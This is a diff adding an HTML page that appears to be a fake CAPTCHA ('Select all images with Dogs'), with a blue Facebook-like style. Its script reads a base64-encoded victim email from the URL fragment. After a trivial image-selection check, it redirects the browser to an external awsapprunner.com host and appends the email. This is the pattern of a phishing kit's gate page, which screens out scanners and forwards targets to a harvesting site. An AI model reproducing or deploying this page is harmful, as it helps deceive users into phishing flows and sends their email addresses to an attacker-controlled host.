@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Custom CAPTCHA</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f9f9f9;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .captcha-container {
+            width: 100%;
+            max-width: 350px;
+            padding: 20px;
+            background-color: #fff;
+            border: 2px solid #1877f2;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0px 6px 15px rgba(0, 0, 0, 0.2);
+        }
+        .captcha-title {
+            background-color: #1877f2;
+            color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .captcha-title img {
+            height: 40px;
+            margin-left: 10px;
+        }
+        .captcha-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 5px;
+            margin-bottom: 10px;
+        }
+        .captcha-grid img {
+            width: 100%;
+            height: 100px; /* Fixed height to make all images uniform */
+            object-fit: cover;
+            cursor: pointer;
+            border: 2px solid transparent;
+            border-radius: 5px;
+        }
+        .captcha-grid img.selected {
+            border-color: blue;
+        }
+        .captcha-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 10px;
+        }
+        .captcha-icons img {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+        }
+        .verify-button {
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100px;
+        }
+        .verify-button:disabled {
+            background-color: #aaa;
+        }
+        @media (max-width: 768px) {
+            .captcha-container {
+                max-width: 100%;
+                padding: 15px;
+            }
+            .captcha-grid img {
+                height: 80px; /* Adjusted for smaller screens */
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="captcha-container">
+        <div class="captcha-title">
+            Select all images with Dogs
+            <img src="https://images.pexels.com/photos/1108099/pexels-photo-1108099.jpeg">
+        </div>
+        <div class="captcha-grid">
+            <img src="https://images.pexels.com/photos/1108099/pexels-photo-1108099.jpeg" onclick="selectImage(this)" data-is-dog="true">
+            <img src="https://images.pexels.com/photos/206916/pexels-photo-206916.jpeg" onclick="selectImage(this)" data-is-dog="true">
+            <img src="https://images.pexels.com/photos/462747/pexels-photo-462747.jpeg" onclick="selectImage(this)" data-is-dog="true">
+            <img src="https://images.pexels.com/photos/169573/pexels-photo-169573.jpeg" onclick="selectImage(this)" data-is-dog="true">
+            <img src="https://images.pexels.com/photos/209460/pexels-photo-209460.jpeg" onclick="selectImage(this)" data-is-dog="false">
+            <img src="https://images.pexels.com/photos/1108099/pexels-photo-1108099.jpeg" onclick="selectImage(this)" data-is-dog="true">
+            <img src="https://images.pexels.com/photos/1108099/pexels-photo-1108099.jpeg" onclick="selectImage(this)" data-is-dog="true">
+            <img src="https://images.pexels.com/photos/1108099/pexels-photo-1108099.jpeg" onclick="selectImage(this)" data-is-dog="true">
+            <img src="https://images.pexels.com/photos/1108099/pexels-photo-1108099.jpeg" onclick="selectImage(this)" data-is-dog="true">
+        </div>
+        <div class="captcha-footer">
+            <div class="captcha-icons">
+                <img src="https://img.icons8.com/material-outlined/24/000000/synchronize.png" alt="refresh" title="Refresh">
+                <img src="https://img.icons8.com/material-outlined/24/000000/speaker.png" alt="audio" title="Audio">
+                <img src="https://img.icons8.com/material-outlined/24/000000/help.png" alt="help" title="Help">
+            </div>
+            <button id="verifyButton" class="verify-button" disabled onclick="verifyCaptcha()">VERIFY</button>
+        </div>
+    </div>
+
+    <script>
+        let selectedImages = [];
+        const requiredSelections = 5;
+        let dogImageSrc = ""; // To store the source of the first selected dog image
+
+        function selectImage(img) {
+            const isDog = img.getAttribute('data-is-dog') === 'true';
+
+            if (isDog) {
+                if (dogImageSrc === "") {
+                    // Set the source of the first dog image selected
+                    dogImageSrc = img.src;
+                }
+
+                if (img.src === dogImageSrc) {
+                    if (img.classList.contains('selected')) {
+                        img.classList.remove('selected');
+                        selectedImages = selectedImages.filter(src => src !== img.src);
+                    } else {
+                        img.classList.add('selected');
+                        selectedImages.push(img.src);
+                    }
+                } else {
+                    alert("Please select images of the same dog.");
+                }
+            } else {
+                alert("This image is not a dog. Please select images of dogs only.");
+            }
+
+            // Enable the verify button if exactly 5 of the same dog images are selected
+            document.getElementById('verifyButton').disabled = selectedImages.length !== requiredSelections || (dogImageSrc !== "" && selectedImages.some(src => src !== dogImageSrc));
+        }
+
+        function extractEmailFromURL() {
+            const urlHash = window.location.hash.substring(1); // Get the portion after '#'
+            try {
+                const decoded = atob(urlHash);
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return emailRegex.test(decoded) ? decoded : null;
+            } catch (e) {
+                return null;
+            }
+        }
+
+        function appendEmailToRedirectURL(baseRedirectURL, email) {
+            if (email) {
+                const encodedEmail = btoa(email);
+                return `${baseRedirectURL}?exze=${encodedEmail}`;
+            }
+            return baseRedirectURL;
+        }
+
+        function verifyCaptcha() {
+            // Simulated validation: Redirect if exactly 5 of the same dog images are selected
+            if (selectedImages.length === requiredSelections && selectedImages.every(src => src === dogImageSrc)) {
+                const baseRedirectURL = "https://mrnzjjbkdp.us-east-2.awsapprunner.com/";
+                const email = extractEmailFromURL();
+                const finalRedirectURL = appendEmailToRedirectURL(baseRedirectURL, email);
+                window.location.href = finalRedirectURL;
+            } else {
+                alert("Please select exactly 5 images of the same dog.");
+            }
+        }
+    </script>
+</body>
+</html>
